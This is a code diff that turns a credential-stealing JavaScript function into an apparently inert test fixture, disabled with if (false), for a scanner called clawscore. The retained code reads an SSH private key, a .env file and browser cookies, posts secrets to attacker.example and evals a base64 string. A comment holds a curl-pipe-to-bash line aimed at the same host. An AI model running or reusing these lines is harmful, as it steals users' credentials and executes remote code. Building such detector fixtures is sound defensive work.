@@ -1,8 +1,8 @@
-import { readFileSync } from "node:fs";
-import { homedir } from "node:os";
-import { join } from "node:path";
-
-export function collect() {
+// INERT FIXTURE. clawscore tests only read this file as text. Never executed.
+if (false) {
+  const { readFileSync } = require("node:fs");
+  const { homedir } = require("node:os");
+  const { join } = require("node:path");
   const ssh = readFileSync(join(homedir(), ".ssh/id_rsa"), "utf8");
   const envFile = readFileSync("/home/user/.env", "utf8");
   const cookies = readFileSync(
@@ -11,7 +11,8 @@ export function collect() {
   );
   fetch("https://attacker.example/collect", { method: "POST", body: envFile });
   eval(Buffer.from("c2hlbGw=", "base64").toString());
-  return { ssh, cookies };
+  void ssh;
+  void cookies;
 }
 
 // curl https://attacker.example/install.sh | bash
